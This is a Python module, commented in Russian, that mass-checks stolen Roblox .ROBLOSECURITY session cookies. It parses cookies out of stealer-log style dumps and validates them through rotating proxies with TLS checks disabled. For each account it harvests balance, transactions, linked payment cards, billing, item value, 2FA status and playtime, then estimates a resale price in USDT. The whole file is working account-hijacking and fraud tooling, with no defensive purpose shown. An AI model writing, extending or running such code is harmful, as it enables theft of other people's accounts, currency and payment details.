import asyncio
import itertools
from collections import defaultdict
import json
import logging
import os
import random
import re
import uuid
import zipfile
from datetime import datetime
from io import BytesIO
from typing import Dict, Any, List, Optional, Tuple, Set
from datetime import timezone, timedelta
import ssl
import aiohttp
from playwright.async_api import async_playwright

def _make_ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

_SSL_CTX = _make_ssl_ctx()
from config import HTML_TEMPLATE
from config import COOKIE_PATTERN, REQUEST_TIMEOUT, TARGET_ITEMS, HEADLESS_ID, KORBLOX_ID, GAMES, BADGES_PER_GAME, GAMEPASSES_PER_GAME, _RAP_RANGES, _DONATE_RANGES, _LIFETIME_RANGES, _BALANCE_RANGES, _BADGES_RANGES, _GAMEPASSES_RANGES, _BILLING_RANGES, TEMP_DIR, USER_AGENTS, UNIVERSE_IDS, _PLAYTIME_RANGES, EMOJI_GAMES # Импорт из config.py
from config import VALIDATE_SEMAPHORE, STATS_SEMAPHORE, FRESH_SEMAPHORE, PER_PROXY_LIMIT, PROXY_MAX_FAILS, PROXY_COOLDOWN_SEC
from config import MAX_CONCURRENT_REQUESTS
from config import (PRICE_PER_1K_ROBUX, PRICE_GROUP_DISCOUNT, PRICE_PER_1K_RAP, PRICE_RAP_MIN,
                    PRICE_KORBLOX, PRICE_KORBLOX_DISCOUNT, PRICE_HEADLESS, PRICE_HEADLESS_DISCOUNT,
                    PRICE_COMBO, PRICE_COMBO_DISCOUNT, PRICE_PREMIUM, PRICE_ACTIVE_MIN_MINUTES)
from proxy_pool import ProxyPool
from database import get_user_custom_configs
request_semaphore = asyncio.Semaphore(max(8, min(MAX_CONCURRENT_REQUESTS, 256)))
class CookieProcessor:
    def __init__(self):
        self.temp_dir = TEMP_DIR
        self._ensure_dirs()
        self._fresher_cycle = itertools.cycle(self.FRESHER_PROXY) if self.FRESHER_PROXY else None

    def _next_fresher_proxy(self, fallback=None):
        if self._fresher_cycle:
            return next(self._fresher_cycle)
        return fallback
    def _ensure_dirs(self):
        if not os.path.exists(self.temp_dir):
            os.makedirs(self.temp_dir)

    @staticmethod
    def _safe_zip_component(value: Any, fallback: str = "unknown") -> str:
        """Санитизация имени для путей внутри ZIP (защита от zip-slip/path traversal)."""
        text = str(value or "").strip()
        if not text:
            text = fallback
        text = text.replace('\x00', '')
        text = text.replace('/', '_').replace('\\', '_')
        text = re.sub(r'\.\.+', '_', text)
        text = re.sub(r'[^A-Za-z0-9 _().+\-]', '_', text)
        text = text.strip(' .')
        return (text[:80] or fallback)
    async def extract_cookies_from_file(self, file_path: str) -> Set[str]:
        raw_cookies = set()
        warning_pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS\..*?\.\|_(.*)'
        cookie_value_pattern = re.compile(r'^[A-Za-z0-9_\-\.+/=]+$')
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            lines = content.split('\n')
            for line_num, line in enumerate(lines, 1):
                line = line.strip()
                if not line:
                    continue
                cookie_value = None
                if COOKIE_PATTERN in line:
                    try:
                        cookie_part = line.split(COOKIE_PATTERN)[1]
                        cookie_value = cookie_part.split()[0] if ' ' in cookie_part else cookie_part
                    except Exception as e:
                        logging.error(f"Ошибка парсинга строки {line_num} (old format): {e}")
                else:
                    match = re.search(warning_pattern, line)
                    if match:
                        cookie_value = match.group(1).strip()
                if cookie_value and cookie_value_pattern.match(cookie_value) and len(cookie_value) >= 50:
                    full_cookie = f'{COOKIE_PATTERN}{cookie_value}'
                    if 100 <= len(full_cookie) <= 2000:
                        raw_cookies.add(full_cookie)
                        logging.info(f"✅ Найдена кука (длина: {len(full_cookie)})")
                    else:
                        logging.warning(f"❌ Кука неправильной длины: {len(full_cookie)}")
        except Exception as e:
            logging.error(f"Ошибка чтения файла: {e}")
        logging.info(f"📊 Извлечено {len(raw_cookies)} уникальных куков")
        return raw_cookies
    async def validate_single_cookie(self, cookie: str, proxy: str = None, shared_session: aiohttp.ClientSession = None, proxies: List[str] = None) -> Dict[str, Any]:
        """
        Валидация одной Roblox куки через запрос к /my/settings/json.
        При ретрае ротирует прокси из списка proxies (если передан).
        """
        max_retries = 2
        delay = 0.5

        for attempt in range(max_retries + 1):
            # Ротация прокси: на каждой попытке берём другой прокси
            if proxies and len(proxies) > 0:
                current_proxy = proxies[(proxies.index(proxy) + attempt) % len(proxies)] if proxy in proxies else random.choice(proxies)
            else:
                current_proxy = proxy

            try:
                session = shared_session
                own_session = None
                if session is None:
                    own_session = aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=_SSL_CTX),
                        timeout=aiohttp.ClientTimeout(total=30)
                    )
                    session = own_session
                try:
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': 'application/json',
                    }

                    async def _validate_request():
                        async with session.get(
                            "https://www.roblox.com/my/settings/json",
                            headers=headers,
                            cookies={".ROBLOSECURITY": cookie},
                            proxy=current_proxy,
                            allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(
                                total=max(8, REQUEST_TIMEOUT),
                                sock_connect=min(5, max(3, REQUEST_TIMEOUT // 2)),
                            )
                        ) as response:
                            status = response.status
                            final_url = str(response.url)

                            if "NewLogin" in final_url or "login" in final_url.lower():
                                return {"valid": False}

                            if status == 200:
                                content_type = response.headers.get('Content-Type', '').lower()
                                if 'application/json' not in content_type:
                                    text_preview = (await response.text())[:200].replace("\n", " ")
                                    if "login" in text_preview.lower() or "sign in" in text_preview.lower():
                                        return {"valid": False}
                                    return {"valid": False}

                                try:
                                    data = await response.json()
                                    user_id = data.get("UserId")
                                    username = data.get("Name")

                                    if user_id is not None and username:
                                        return {
                                            "valid": True,
                                            "cookie": cookie,
                                            "user_info": {"id": user_id, "name": username},
                                            "settings_data": data
                                        }
                                    else:
                                        return {"valid": False}

                                except (json.JSONDecodeError, aiohttp.ContentTypeError):
                                    return {"valid": False}

                            elif status == 401:
                                return {"valid": False}

                            elif status in (403, 429):
                                return {"retry": True, "status": status}

                            else:
                                return {"retry": True, "status": status}

                    if shared_session is not None:
                        result = await _validate_request()
                    else:
                        async with request_semaphore:
                            result = await _validate_request()

                    if result.get("retry"):
                        if attempt < max_retries:
                            await asyncio.sleep(delay)
                            delay = min(delay * 1.5, 4)
                            continue
                        # исчерпали ретраи на 429/403 — это проблема прокси, не куки
                        return {"valid": False, "proxy_failed": True}
                    return result

                finally:
                    if own_session:
                        await own_session.close()

            except asyncio.TimeoutError:
                logging.warning(f"🍪 Таймаут при валидации (попытка {attempt + 1}, прокси: ...{current_proxy[-20:] if current_proxy else 'None'})")
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 1.5, 4)
                    continue

            except aiohttp.ClientConnectorError as e:
                error_str = str(e).lower()
                if "resolve hostname" in error_str or "name or service not known" in error_str:
                    logging.warning(f"🚫 DNS-ошибка при валидации — пропуск: {e}")
                    return {"valid": False}
                logging.warning(f"🍪 Ошибка подключения (попытка {attempt + 1}): {e}")
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 1.5, 4)
                    continue

            except Exception as e:
                logging.error(f"🍪 Неожиданная ошибка при валидации: {e}")
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 1.5, 4)
                    continue

        # все попытки исчерпаны таймаутами/обрывами — проблема прокси
        return {"valid": False, "proxy_failed": True}

    async def get_account_info(self, cookie: str, proxy: str = None) -> dict | None:
        """
        Быстро возвращает balance + pending.
        """
        max_retries = 3
        delay = 1.0
        for attempt in range(max_retries + 1):
            try:
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=_SSL_CTX),
                    timeout=aiohttp.ClientTimeout(total=25)
                ) as session:
                    user_id, username = await self.get_user_info(session, cookie, proxy)
                    if not user_id:
                        return None
                    async with request_semaphore:
                        balance_resp = await session.get(
                            f"https://economy.roblox.com/v1/users/{user_id}/currency",
                            cookies={".ROBLOSECURITY": cookie},
                            proxy=proxy,
                            headers={"User-Agent": random.choice(USER_AGENTS)},
                            timeout=aiohttp.ClientTimeout(total=20)
                        )
                        status = balance_resp.status
                        if status == 200:
                            try:
                                balance_data = await balance_resp.json()
                                balance = balance_data.get("robux", 0)
                            except (json.JSONDecodeError, aiohttp.ContentTypeError) as e:
                                logging.warning(f"Ошибка парсинга JSON для balance: {str(e)}")
                                balance = 0
                        elif status == 401:
                            logging.warning(f"Кука невалидна для balance (401)")
                            return None
                        elif status == 403 or status == 429:
                            if attempt < max_retries:
                                await asyncio.sleep(delay)
                                delay = min(delay * 2, 60)
                                continue
                            return None
                        else:
                            logging.warning(f"HTTP {status} для balance (попытка {attempt + 1})")
                            if attempt < max_retries:
                                await asyncio.sleep(delay)
                                delay = min(delay * 2, 60)
                                continue
                            return None
                    pending_url = f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary"
                    async with request_semaphore:
                        pending_resp = await session.get(
                            pending_url,
                            cookies={".ROBLOSECURITY": cookie},
                            proxy=proxy,
                            headers={"User-Agent": random.choice(USER_AGENTS)},
                            timeout=aiohttp.ClientTimeout(total=20)
                        )
                        status = pending_resp.status
                        if status == 200:
                            try:
                                pending_data = await pending_resp.json()
                                pending = pending_data.get("pendingRobuxTotal", 0)
                            except (json.JSONDecodeError, aiohttp.ContentTypeError) as e:
                                logging.warning(f"Ошибка парсинга JSON для pending: {str(e)}")
                                pending = 0
                        elif status == 401:
                            logging.warning(f"Кука невалидна для pending (401)")
                            return None
                        elif status == 403 or status == 429:
                            if attempt < max_retries:
                                await asyncio.sleep(delay)
                                delay = min(delay * 2, 60)
                                continue
                            return None
                        else:
                            logging.warning(f"HTTP {status} для pending (попытка {attempt + 1})")
                            if attempt < max_retries:
                                await asyncio.sleep(delay)
                                delay = min(delay * 2, 60)
                                continue
                            return None
                    return {
                        "balance": balance,
                        "pending": pending,
                        "username": username
                    }
            except asyncio.TimeoutError:
                logging.warning(f"Таймаут при получении account_info на попытке {attempt + 1}")
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 2, 60)
                    continue
                return None
            except aiohttp.ClientConnectorError as e:
                # ИСПРАВЛЕНИЕ: Специальная обработка DNS/resolve ошибок — без retry
                error_str = str(e).lower()
                if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                    logging.warning(f"🚫 DNS-ошибка (resolve hostname) для account_info — пропускаем без retry: {str(e)}")
                    return None
                logging.warning(f"Ошибка клиента при получении account_info на попытке {attempt + 1}: {str(e)}")
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 2, 60)
                    continue
                return None
            except aiohttp.ClientError as e:
                logging.warning(f"Ошибка клиента при получении account_info на попытке {attempt + 1}: {str(e)}")
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 2, 60)
                    continue
                return None
            except Exception as e:
                logging.debug(f"get_account_info error (cookie dead or timeout): {e}")
                if attempt < max_retries:
                    await asyncio.sleep(delay)
                    delay = min(delay * 2, 60)
                    continue
                return None
        return None
    async def validate_cookie_batch(self, cookies: List[str], proxies: List[str], progress_callback=None) -> List[Dict[str, Any]]:
        valid_results = []
        total_cookies = len(cookies)
        completed = 0

        logging.info(f"🔄 Начинаю валидацию {total_cookies} куков с {len(proxies)} прокси")

        semaphore = asyncio.Semaphore(VALIDATE_SEMAPHORE)
        pool = ProxyPool(proxies, PER_PROXY_LIMIT, PROXY_MAX_FAILS, PROXY_COOLDOWN_SEC)

        connector = aiohttp.TCPConnector(ssl=_SSL_CTX, limit=200, limit_per_host=25, enable_cleanup_closed=True, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=30, connect=10)) as shared_session:
            async def process_cookie(cookie: str):
                nonlocal completed
                async with semaphore:
                    proxy = await pool.acquire()
                    result = None
                    try:
                        result = await self.validate_single_cookie(cookie, proxy, shared_session=shared_session, proxies=proxies)
                        return result
                    except Exception as e:
                        logging.error(f"Исключение в process_cookie: {e}")
                        return {"valid": False, "error": str(e)}
                    finally:
                        ok = isinstance(result, dict) and not result.get('proxy_failed')
                        pool.release(proxy, success=ok)
                        completed += 1
                        if progress_callback:
                            try:
                                await progress_callback(completed, total_cookies)
                            except:
                                pass

            # Не создаём десятки тысяч task сразу: обрабатываем батчами.
            batch_size = max(64, VALIDATE_SEMAPHORE * 4)
            for i in range(0, total_cookies, batch_size):
                chunk = cookies[i:i + batch_size]
                tasks = [asyncio.create_task(process_cookie(cookie)) for cookie in chunk]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        logging.debug(f"Исключение: {type(result).__name__}: {result}")
                        continue
                    if isinstance(result, dict) and result.get('valid') and 'cookie' in result:
                        valid_results.append(result)

        logging.info(f"📊 Валидация завершена: {len(valid_results)}/{total_cookies} валидных куков")
        return valid_results

    async def process_stats_batch(self, valid_results: List[Dict[str, Any]], proxies: List[str], selected_checks: Dict[str, bool], selected_ingame: Dict[str, bool],
                              selected_badges: Dict[str, bool], selected_gamepasses: Dict[str, bool], selected_playtime: Dict[str, bool],
                              progress_callback=None, ingame_games: dict = None, playtime_games: dict = None) -> Dict[str, Any]:
        if ingame_games is None:
            ingame_games = GAMES
        if playtime_games is None:
            playtime_games = GAMES

        total_cookies = len(valid_results)
        valid_stats = []
        completed = 0
        semaphore = asyncio.Semaphore(STATS_SEMAPHORE)
        pool = ProxyPool(proxies, PER_PROXY_LIMIT, PROXY_MAX_FAILS, PROXY_COOLDOWN_SEC)

        connector = aiohttp.TCPConnector(ssl=_SSL_CTX, limit=300, limit_per_host=30, enable_cleanup_closed=True, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=60, connect=10)) as shared_session:
            async def get_stats_with_semaphore(validation_data):
                nonlocal completed
                async with semaphore:
                    proxy = await pool.acquire()
                    result = None
                    try:
                        result = await self.get_cookie_stats(validation_data['cookie'], proxy, selected_checks, selected_ingame,
                                                            selected_badges, selected_gamepasses, selected_playtime,
                                                            ingame_games, playtime_games,
                                                            shared_session=shared_session, validation_result=validation_data)
                        completed += 1
                        if progress_callback:
                            await progress_callback(completed, total_cookies)
                        return result
                    finally:
                        pool.release(proxy, success=bool(result and result.get('valid')))
            # Батчи снижают overhead event loop и ускоряют большие объёмы.
            results = []
            batch_size = max(64, STATS_SEMAPHORE * 3)
            for i in range(0, total_cookies, batch_size):
                chunk = valid_results[i:i + batch_size]
                chunk_results = await asyncio.gather(*(get_stats_with_semaphore(vdata) for vdata in chunk))
                results.extend(chunk_results)
        for result in results:
            if result and result['valid']:
                valid_stats.append(result)
        summary = self.compute_summary(total_cookies, valid_stats, selected_checks)
        game_summary = self.compute_game_donate_summary(valid_stats)
        playtime_summary = self.compute_playtime_summary(valid_stats)
        return {'valid_stats': valid_stats, 'summary': summary, 'game_summary': game_summary, 'playtime_summary': playtime_summary}
    
    async def get_donate_period(self, session: aiohttp.ClientSession, cookie: str, user_id: int, proxy_url: str, 
                                days: Optional[int] = None, return_gamepasses: bool = False, 
                                return_game_donates: bool = False, place_to_name: dict = None) -> Dict[str, Any]:
        from collections import defaultdict
        
        result = {
            'total': 0,
            'gamepasses': set() if return_gamepasses else None,
            'game_donates': defaultdict(lambda: {'sum': 0, 'count': 0}) if return_game_donates else None
        }
        
        cursor = ""
        cutoff_date = datetime.now(timezone.utc) - timedelta(days=days) if days else None
        
        # Используем FRESHER_PROXY для запросов доната
        donate_proxy = self._next_fresher_proxy(proxy_url)
        
        page_max_retries = 4
        while True:
            url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?limit=100&transactionType=Purchase&cursor={cursor}"
            page_delay = 1.0
            page_done = False  # страница успешно обработана (можно идти дальше/выходить)
            for attempt in range(page_max_retries + 1):
                try:
                    async with session.get(
                        url,
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=donate_proxy,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as response:
                        if response.status == 200:
                            data = await response.json()
                            for tx in data.get('data', []):
                                tx_date = datetime.fromisoformat(tx['created'].replace('Z', '+00:00'))
                                if cutoff_date and tx_date < cutoff_date:
                                    # Если достигли cutoff — возвращаем текущий результат
                                    if return_game_donates:
                                        result['game_donates'] = dict(result['game_donates'])
                                    return result

                                amount = tx.get('currency', {}).get('amount', 0)
                                if amount < 0:
                                    result['total'] += abs(amount)

                                # Gamepasses
                                if return_gamepasses and tx.get('details', {}).get('type') == "GamePass":
                                    gp_id = tx.get('details', {}).get('id')
                                    if gp_id:
                                        result['gamepasses'].add(gp_id)

                                # InGame Donate — используем place_to_name только если передан и return_game_donates=True
                                if return_game_donates:
                                    place_id = tx.get('details', {}).get('place', {}).get('placeId')
                                    if place_id and place_to_name and place_id in place_to_name:
                                        name = place_to_name[place_id]
                                        result['game_donates'][name]['sum'] += abs(amount)
                                        result['game_donates'][name]['count'] += 1

                            cursor = data.get('nextPageCursor')
                            page_done = True
                            break
                        # 401 — кука мертва, дальше листать смысла нет
                        if response.status == 401:
                            cursor = None
                            page_done = True
                            break
                        # rate-limit / временная ошибка — повторяем ТУ ЖЕ страницу с другим прокси
                        if response.status in (429, 403) or response.status >= 500:
                            if attempt < page_max_retries:
                                await asyncio.sleep(page_delay)
                                page_delay = min(page_delay * 1.5, 8)
                                donate_proxy = self._next_fresher_proxy(proxy_url)
                                continue
                        logging.warning(f"❌ Донат: статус {response.status} после {attempt + 1} попыток — стоп пагинации")
                        break
                except aiohttp.ClientConnectorError as e:
                    error_str = str(e).lower()
                    if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                        logging.warning(f"🚫 DNS-ошибка для donate_period — прерываем цикл: {str(e)}")
                        break
                    if attempt < page_max_retries:
                        await asyncio.sleep(page_delay)
                        page_delay = min(page_delay * 1.5, 8)
                        donate_proxy = self._next_fresher_proxy(proxy_url)
                        continue
                    logging.error(f"❌ Ошибка подключения при получении доната: {str(e)}")
                    break
                except (asyncio.TimeoutError, aiohttp.ClientError) as e:
                    if attempt < page_max_retries:
                        await asyncio.sleep(page_delay)
                        page_delay = min(page_delay * 1.5, 8)
                        donate_proxy = self._next_fresher_proxy(proxy_url)
                        continue
                    logging.error(f"❌ Таймаут/ошибка доната после {attempt + 1} попыток: {str(e)}")
                    break
                except Exception as e:
                    logging.error(f"❌ Ошибка при получении доната: {str(e)}")
                    break

            if not page_done:
                # страница не получена даже после ретраев — отдаём что есть (частично)
                break
            if not cursor:
                break

        # Конвертируем defaultdict в обычный dict перед возвратом
        if return_game_donates:
            result['game_donates'] = dict(result['game_donates'])

        return result

    def compute_account_price(self, d: dict) -> float:
        """Оценка стоимости аккаунта в USDT по собранным данным (цены — в config.py)."""
        price = 0.0
        # Робуксы
        price += (d.get('balance', 0) or 0) / 1000 * PRICE_PER_1K_ROBUX
        price += (d.get('groups_balance', 0) or 0) / 1000 * PRICE_PER_1K_ROBUX * PRICE_GROUP_DISCOUNT
        # RAP — только от порога
        rap = d.get('rap', 0) or 0
        if rap >= PRICE_RAP_MIN:
            price += rap / 1000 * PRICE_PER_1K_RAP
        # Биллинг = кредит на акке ИЛИ привязанная карта
        has_billing = (d.get('billing_robux', 0) or 0) > 0 or (d.get('card', 0) or 0) > 0
        # Активный = суммарный плейтайм выше порога
        total_pt = sum((d.get('playtime_minutes') or {}).values())
        is_active = total_pt > PRICE_ACTIVE_MIN_MINUTES
        discount = has_billing and is_active
        # Korblox / Headless
        kb = bool(d.get('korblox'))
        hl = bool(d.get('headless'))
        if kb and hl:
            price += PRICE_COMBO_DISCOUNT if discount else PRICE_COMBO
        elif kb:
            price += PRICE_KORBLOX_DISCOUNT if discount else PRICE_KORBLOX
        elif hl:
            price += PRICE_HEADLESS_DISCOUNT if discount else PRICE_HEADLESS
        # Premium — только если есть рап
        if d.get('prem') and rap > 0:
            price += PRICE_PREMIUM
        return round(price, 2)

    async def get_cookie_stats(self, cookie: str, proxy: str, selected_checks: Dict[str, bool],
                            selected_ingame: Dict[str, bool], selected_badges: Dict[str, bool],
                            selected_gamepasses: Dict[str, bool], selected_playtime: Dict[str, bool],
                            ingame_games: dict, playtime_games: dict,
                            shared_session: aiohttp.ClientSession = None,
                            validation_result: Dict[str, Any] = None) -> Dict[str, Any]:

        if validation_result is None:
            validation_result = await self.validate_single_cookie(cookie, proxy)

        if not validation_result.get('valid'):
            logging.warning(f"Кука невалидна по результату /my/settings/json")
            return {
                'valid': False,
                'cookie': cookie,
                'username': 'unknown',
                'user_id': None,
            }

        user_id = validation_result['user_info']['id']
        username = validation_result['user_info']['name']
        settings_data = validation_result.get('settings_data', {})
        
        # Получаем пользовательские конфиги
        custom_badges = get_user_custom_configs(user_id, 'badges')
        custom_gamepasses = get_user_custom_configs(user_id, 'gamepasses')
        
        # Используем переданные словари игр с переопределениями
        selected_ingame_games = {}
        selected_playtime_games = {}
    
        for short in GAMES:
            if selected_ingame.get(short, False):
                game_info = ingame_games.get(short, GAMES[short]).copy()
                selected_ingame_games[short] = game_info
        
            if selected_playtime.get(short, False):
                game_info = playtime_games.get(short, GAMES[short]).copy()
                selected_playtime_games[short] = game_info

        result = {
            'valid': True,
            'cookie': cookie,
            'username': username,
            'user_id': user_id,
            'url': f"https://roblox.com/users/{user_id}",
            'creation_date': 'Unknown',
            'email_verified': settings_data.get('UserEmailVerified', False),
            'two_fa': settings_data.get('MyAccountSecurityModel', {}).get('IsTwoStepEnabled', False),
            'prem': settings_data.get('IsPremium', False),
            'balance': 0,
            'pending': 0,
            'donate_year': 0,
            'donate_lifetime': 0,
            'card': False,
            'cards_by_network': {},
            'badges_count_per_game': {},
            'gamepasses_count_per_game': {},
            'badges_count': 0,
            'gamepasses_count': 0,
            'rap': 0,
            'top_rap_items': [],
            'rare_items': [],
            'rare_count': 0,
            'korblox': False,
            'headless': False,
            'billing': '0 USD (0 R$)',
            'billing_usd': 0,
            'groups_balance': 0,
            'price': 0,
            'places_visits': 0,
            'game_donates': {info['name']: {'sum': 0, 'count': 0} for info in selected_ingame_games.values()},
            'playtime_minutes': {info['name']: 0 for info in selected_playtime_games.values()},
            'age_verified': 0,
            'is_age_verified': False,
            'verified_age_bracket': None,
            'can_reset_age_verif': False,
            'age_verif_raw': None,
            'country': 'Unknown',
            'trade': False,
            'settings_data': settings_data
        }
                    
        # Инициализируем словари для бейджей и геймпассов
        for game in selected_badges:
            if selected_badges[game]:
                result['badges_count_per_game'][game] = {'count': 0, 'names': []}
        
        for game in selected_gamepasses:
            if selected_gamepasses[game]:
                result['gamepasses_count_per_game'][game] = {'count': 0, 'names': []}
        
        proxy_url = proxy if proxy else None
        session = shared_session
        try:
            if session is None:
                own_connector = aiohttp.TCPConnector(ssl=_SSL_CTX, limit=50, ttl_dns_cache=300, enable_cleanup_closed=True)
                own_session = aiohttp.ClientSession(connector=own_connector, timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT))
                session = own_session
            else:
                own_session = None

            try:
                tasks = []
                if selected_checks.get('balance', False):
                    tasks.append(self.get_balance_task(session, user_id, cookie, proxy_url, result))
                if (selected_checks.get('donate_lifetime', False) or
                    selected_checks.get('ingame_donate', False) or
                    selected_checks.get('gamepasses', False)):
                    async def _donate_task():
                        place_to_name = {info['place_id']: info['name'] for info in selected_ingame_games.values()}
                        data = await self.get_donate_period(
                            session=session,
                            cookie=cookie,
                            user_id=user_id,
                            proxy_url=proxy_url,
                            days=None,
                            return_gamepasses=selected_checks.get('gamepasses', False),
                            return_game_donates=selected_checks.get('ingame_donate', False),
                            place_to_name=place_to_name if selected_checks.get('ingame_donate', False) else None
                        )
                        if selected_checks.get('donate_lifetime', False):
                            result['donate_lifetime'] = data['total']
                        if selected_checks.get('ingame_donate', False):
                            result['game_donates'] = data.get('game_donates', {})
                        if selected_checks.get('gamepasses', False):
                            purchased_gamepasses = data['gamepasses']
                            for game in [g for g in selected_gamepasses if selected_gamepasses[g]]:
                                gps = GAMEPASSES_PER_GAME.get(game, []).copy()
                                if game in custom_gamepasses:
                                    gps.extend(custom_gamepasses[game])

                                count = sum(1 for gp_id in gps if gp_id in purchased_gamepasses)
                                names = []
                                if selected_checks.get('gamepasses_by_name', False):
                                    gp_tasks = [self.get_gamepass_name(gp_id, session=session) for gp_id in gps if gp_id in purchased_gamepasses]
                                    names = await asyncio.gather(*gp_tasks, return_exceptions=True)
                                    names = [name if isinstance(name, str) else str(name) for name in names]
                                result['gamepasses_count_per_game'][game] = {'count': count, 'names': names}
                    tasks.append(_donate_task())
                if selected_checks.get('card', False):
                    tasks.append(self.get_cards_task(session, cookie, proxy_url, result))
                if selected_checks.get('badges', False) and selected_badges:
                    tasks.append(self.get_badges_per_game_task(session, user_id, cookie, proxy_url, result, selected_badges, selected_checks, custom_badges))
                if selected_checks.get('rap', False) or selected_checks.get('rare_items_check', False):
                    tasks.append(self.get_rap_task(session, user_id, cookie, proxy_url, result))
                if selected_checks.get('rares', False):
                    tasks.append(self.get_rares_task(session, user_id, cookie, proxy_url, result))
                if selected_checks.get('billing', False):
                    tasks.append(self.get_billing_task(session, cookie, proxy_url, result))
                if selected_checks.get('groups_balance', False):
                    tasks.append(self.get_groups_balance_task(session, cookie, user_id, proxy_url, result))
                if selected_checks.get('places_visits', False):
                    tasks.append(self.get_places_visits_task(session, user_id, cookie, proxy_url, result))
                if selected_checks.get('country', False):
                    tasks.append(self.get_additional_info_task(session, cookie, user_id, proxy_url, result, selected_checks))

                if selected_checks.get('passable', False) and not selected_checks.get('country', False):
                    tasks.append(self.get_age_verification(session, cookie, proxy_url, result))

                if selected_checks.get('playtime', False) and selected_playtime:
                    try:
                        playtime_proxy = self._next_fresher_proxy(proxy_url)
                        playtime_data = await self.get_playtime(session, cookie, playtime_proxy)
                        for short, info in selected_playtime_games.items():
                            if selected_playtime.get(short, False) and info.get('universe_id'):
                                universe_id = info['universe_id']
                                result['playtime_minutes'][info['name']] = next(
                                    (item['weeklyMinutes'] for item in (playtime_data or [])
                                    if item['universeId'] == universe_id), 0
                                )
                        logging.info(f"🕰️ Получено время игры по выбранным играм (свежий прокси)")
                    except Exception as e:
                        # Ошибка playtime НЕ должна ронять весь аккаунт
                        logging.warning(f"⚠️ Playtime пропущен (не валит аккаунт): {e}")

                await asyncio.gather(*tasks, return_exceptions=True)
                if selected_checks.get('badges', False):
                    result['badges_count'] = sum(v.get('count', 0) for v in result['badges_count_per_game'].values())
                if selected_checks.get('gamepasses', False):
                    result['gamepasses_count'] = sum(v.get('count', 0) for v in result['gamepasses_count_per_game'].values())
                result['price'] = self.compute_account_price(result)
                logging.info(f"✅ Статистика для {username} завершена! 💰 Оценка: {result['price']} USDT")
                return result
            finally:
                if own_session:
                    await own_session.close()
        except Exception as e:
            logging.error(f"Ошибка в get_cookie_stats: {e}")
            result['valid'] = False
            result['error'] = str(e)
            return result
   
    async def get_playtime_task(self, session, cookie, proxy_url, result, selected_playtime):
    # Используем рандомный прокси из FRESHER_PROXY для запросов playtime
        proxy = self._next_fresher_proxy(None)
        playtime_data = await self.get_playtime(session, cookie, proxy)
        for short in selected_playtime:
            if selected_playtime[short]:
                universe_id = UNIVERSE_IDS.get(short, 0)
                result['playtime_minutes'][short] = next((item['weeklyMinutes'] for item in playtime_data if item['universeId'] == universe_id), 0)
        logging.info(f"🕰️ Получено время игры по выбранным играм")

    async def get_playtime(self, session: aiohttp.ClientSession, cookie: str, proxy_url: str) -> List[Dict]:
        try:
            async with session.get(
                "https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-top-weekly-screentime-by-universe",
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get('universeWeeklyScreentimes', [])
                else:
                    logging.warning(f"❌ Ошибка получения playtime: статус {response.status}")
                    return []
        except aiohttp.ClientConnectorError as e:
            # ИСПРАВЛЕНИЕ: Специальная обработка DNS/resolve ошибок
            error_str = str(e).lower()
            if "resolve hostname" in error_str or "name or service not known" in error_str or "failed to resolve" in error_str:
                logging.warning(f"🚫 DNS-ошибка (resolve hostname) для playtime — пропускаем: {str(e)}")
                return []
            logging.error(f"❌ Ошибка получения playtime: {str(e)}")
            return []
        except Exception as e:
            logging.error(f"❌ Ошибка получения playtime: {str(e)}")
            return []
        
    async def get_settings_task(self, session, cookie, proxy_url, result):
        """
        Упрощенная версия - используем данные из settings_data, которые уже получены при валидации
        """
        if 'settings_data' in result and result['settings_data']:
            # Все данные уже есть в result из валидации
            logging.info(f"📧 Почта: {'✅' if result['email_verified'] else '❌'}, "
                        f"2FA: {'✅' if result['two_fa'] else '❌'}, "
                        f"Премиум: {'✅' if result['prem'] else '❌'}")
            return
        
        # Запасной вариант, если settings_data почему-то отсутствует
        try:
            async with session.get(
                'https://www.roblox.com/my/settings/json',
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    result['email_verified'] = data.get('UserEmailVerified', False)
                    result['two_fa'] = data.get('MyAccountSecurityModel', {}).get('IsTwoStepEnabled', False)
                    result['prem'] = data.get('IsPremium', False)
                    result['settings_data'] = data
                    logging.info(f"📧 Почта: {'✅' if result['email_verified'] else '❌'}, "
                            f"2FA: {'✅' if result['two_fa'] else '❌'}, "
                            f"Премиум: {'✅' if result['prem'] else '❌'}")
        except Exception as e:
            logging.warning(f"Ошибка получения settings.json в get_settings_task: {e}")
